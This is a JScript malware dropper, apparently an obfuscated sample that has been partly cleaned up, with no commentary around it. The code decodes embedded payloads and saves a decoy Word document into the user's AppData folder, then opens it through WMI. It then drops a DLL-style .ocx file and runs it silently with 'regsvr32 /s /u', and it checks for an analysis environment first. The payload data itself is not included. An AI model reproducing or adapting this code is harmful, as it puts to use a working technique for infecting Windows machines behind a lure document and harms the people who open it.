function GetLength(Obj) {return Obj.length;}
function ConvertChar(Arg){return String.fromCharCode(Arg);}
function DecryptData(InputArray) 
{
    var tab = [];
    var TmpArray = [];
    var str = "";
    var j;
    var c;
    var i = 0;
    tab[0x80] = 0x00C7;
    tab[0x81] = 0x00FC;
    tab[0x82] = 0x00E9;
    tab[0x83] = 0x00E2;
    tab[0x84] = 0x00E4;
    tab[0x85] = 0x00E0;
    tab[0x86] = 0x00E5;
    tab[0x87] = 0x00E7;
    tab[0x88] = 0x00EA;
    tab[0x89] = 0x00EB;
    tab[0x8A] = 0x00E8;
    tab[0x8B] = 0x00EF;
    tab[0x8C] = 0x00EE;
    tab[0x8D] = 0x00EC;
    tab[0x8E] = 0x00C4;
    tab[0x8F] = 0x00C5;
    tab[0x90] = 0x00C9;
    tab[0x91] = 0x00E6;
    tab[0x92] = 0x00C6;
    tab[0x93] = 0x00F4;
    tab[0x94] = 0x00F6;
    tab[0x95] = 0x00F2;
    tab[0x96] = 0x00FB;
    tab[0x97] = 0x00F9;
    tab[0x98] = 0x00FF;
    tab[0x99] = 0x00D6;
    tab[0x9A] = 0x00DC;
    tab[0x9B] = 0x00A2;
    tab[0x9C] = 0x00A3;
    tab[0x9D] = 0x00A5;
    tab[0x9E] = 0x20A7;
    tab[0x9F] = 0x0192;
    tab[0xA0] = 0x00E1;
    tab[0xA1] = 0x00ED;
    tab[0xA2] = 0x00F3;
    tab[0xA3] = 0x00FA;
    tab[0xA4] = 0x00F1;
    tab[0xA5] = 0x00D1;
    tab[0xA6] = 0x00AA;
    tab[0xA7] = 0x00BA;
    tab[0xA8] = 0x00BF;
    tab[0xA9] = 0x2310;
    tab[0xAA] = 0x00AC;
    tab[0xAB] = 0x00BD;
    tab[0xAC] = 0x00BC;
    tab[0xAD] = 0x00A1;
    tab[0xAE] = 0x00AB;
    tab[0xAF] = 0x00BB;
    tab[0xB0] = 0x2591;
    tab[0xB1] = 0x2592;
    tab[0xB2] = 0x2593;
    tab[0xB3] = 0x2502;
    tab[0xB4] = 0x2524;
    tab[0xB5] = 0x2561;
    tab[0xB6] = 0x2562;
    tab[0xB7] = 0x2556;
    tab[0xB8] = 0x2555;
    tab[0xB9] = 0x2563;
    tab[0xBA] = 0x2551;
    tab[0xBB] = 0x2557;
    tab[0xBC] = 0x255D;
    tab[0xBD] = 0x255C;
    tab[0xBE] = 0x255B;
    tab[0xBF] = 0x2510;
    tab[0xC0] = 0x2514;
    tab[0xC1] = 0x2534;
    tab[0xC2] = 0x252C;
    tab[0xC3] = 0x251C;
    tab[0xC4] = 0x2500;
    tab[0xC5] = 0x253C;
    tab[0xC6] = 0x255E;
    tab[0xC7] = 0x255F;
    tab[0xC8] = 0x255A;
    tab[0xC9] = 0x2554;
    tab[0xCA] = 0x2569;
    tab[0xCB] = 0x2566;
    tab[0xCC] = 0x2560;
    tab[0xCD] = 0x2550;
    tab[0xCE] = 0x256C;
    tab[0xCF] = 0x2567;
    tab[0xD0] = 0x2568;
    tab[0xD1] = 0x2564;
    tab[0xD2] = 0x2565;
    tab[0xD3] = 0x2559;
    tab[0xD4] = 0x2558;
    tab[0xD5] = 0x2552;
    tab[0xD6] = 0x2553;
    tab[0xD7] = 0x256B;
    tab[0xD8] = 0x256A;
    tab[0xD9] = 0x2518;
    tab[0xDA] = 0x250C;
    tab[0xDB] = 0x2588;
    tab[0xDC] = 0x2584;
    tab[0xDD] = 0x258C;
    tab[0xDE] = 0x2590;
    tab[0xDF] = 0x2580;
    tab[0xE0] = 0x03B1;
    tab[0xE1] = 0x00DF;
    tab[0xE2] = 0x0393;
    tab[0xE3] = 0x03C0;
    tab[0xE4] = 0x03A3;
    tab[0xE5] = 0x03C3;
    tab[0xE6] = 0x00B5;
    tab[0xE7] = 0x03C4;
    tab[0xE8] = 0x03A6;
    tab[0xE9] = 0x0398;
    tab[0xEA] = 0x03A9;
    tab[0xEB] = 0x03B4;
    tab[0xEC] = 0x221E;
    tab[0xED] = 0x03C6;
    tab[0xEE] = 0x03B5;
    tab[0xEF] = 0x2229;
    tab[0xF0] = 0x2261;
    tab[0xF1] = 0x00B1;
    tab[0xF2] = 0x2265;
    tab[0xF3] = 0x2264;
    tab[0xF4] = 0x2320;
    tab[0xF5] = 0x2321;
    tab[0xF6] = 0x00F7;
    tab[0xF7] = 0x2248;
    tab[0xF8] = 0x00B0;
    tab[0xF9] = 0x2219;
    tab[0xFA] = 0x00B7;
    tab[0xFB] = 0x221A;
    tab[0xFC] = 0x207F;
    tab[0xFD] = 0x00B2;
    tab[0xFE] = 0x25A0;
    tab[0xFF] = 0x00A0;
    do 
    {
        j = InputArray[i];
        if (j < 128) {c = j;}
        else {c = tab[j];}
        TmpArray.push(ConvertChar(c));
        i += 1;
    } while (i < GetLength(InputArray));
    str = TmpArray.join("");
    return str;
}
function GetActXObj(Arg) {return new ActiveXObject(Arg);
}
function GetRandomNumber() {return Math.floor(Math.random() * 65536);
}
function Writepayload(Arg1, path, d, off_Init, mod)
{
    var Errorcode;
    try 
    {
        var DecAr = InitBase(Arg1);
        var DataEncPayload =  Decrypt(DecAr, d, off_Init);
        DecAr = 0;
        if (mod === 1 && DataEncPayload[0] !== 0x4D && DataEncPayload[1] !== 0x5a){return 0;}
        var ActXobj1 = GetActXObj(uprpjw444(uprpjw8427, uprpjw2, o));
        ActXobj1.open();
        ActXobj1.position = 0;
        ActXobj1.type = 2;
        ActXobj1.charset = 437;
        ActXobj1.writeText(DecryptData(DataEncPayload));
        DataEncPayload = 0;
        ActXobj1.saveToFile(path);
        ActXobj1.close();
        Errorcode = 1;
    } 
    catch (e) {return 0;}
    return Errorcode;
}
function AntiDebug() 
{
    try 
    {
        uprpjw277.uprpjw571;
        return true;
    } 
    catch(e) 
    {
        if (typeof WScript === 'object') {return true;}
        InitPayload();
    }
}
function Readkey()
{
    var ShObj1;
    var r;
    try
    {
        ShObj1 = GetActXObj("WScript.Shell");
        r = ShObj1.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Winword.exe\\");
        if (!r) {return false;}
        return r;
    } 
    catch(e){return false;}
}
function InitPayload()
{
    var ActXobj2;
    var env_App;
    var BasePath = "";
    var PathCommand = "";
    try 
    {
        ActXobj2 = GetActXObj("WScript.Shell");
        env_App = ActXobj2.environment("PROCESS");
        BasePath = env_App("APPDATA");
        if (BasePath != "") {BasePath = BasePath + "\\Microsoft\\";}
    } 
    catch (e) {BasePath = "";}
    var PathDoc;
    PathDoc = BasePath + GetRandomNumber() + ".doc";
    if (Writepayload(PayLure, PathDoc, uprpjw2, o, 0) === 1)
    {
        var PathCommandDoc = '"' + PathDoc + '"';
        var CodeDoc = 0;
        try 
        {
            var uprpjw318 = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
            var p = Readkey();
            if (p) 
            {
                var uprpjw6962 = uprpjw318.Get("Win32_Process").Create(p + " " + PathCommandDoc, null, null, 0);
                if (uprpjw6962 !== 0){uprpjw6044; }
            }
        }
        catch(e) 
        {
            try
            {
                ActXobj2.Run(PathCommandDoc, 1, 0);
                CodeDoc = 1;
            } 
            catch (uprpjw7231) {CodeDoc = 0;}
        }
        PathCommandDoc = 0;
    }
    PayLure = 0;
    PathDoc = 0;
    BasePath = BasePath + GetRandomNumber() + ".ocx";
    if (Writepayload(PayOCX, BasePath, uprpjw2, o, 1) === 1)
    {
        PayOCX = "";
        var code = 0;
        PathCommand = "regsvr32 /s /u " + '"' + BasePath + '"';
        try 
        {
            var WMIObj2 = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
            var r = WMIObj2.Get("Win32_Process").Create(PathCommand, null, null, 0);
            if (r !== 0) {unVal1;}
        } 
        catch (e) 
        {
            try
            {
                ActXobj2.Run(PathCommand, 1, 0);
                code = 1;
            } 
                catch (e) {code = 0;}
        }
    }
}
try {if (OpAr && off && PayLure && PayOCX ){AntiDebug();}}
catch (e){var u = 0;}
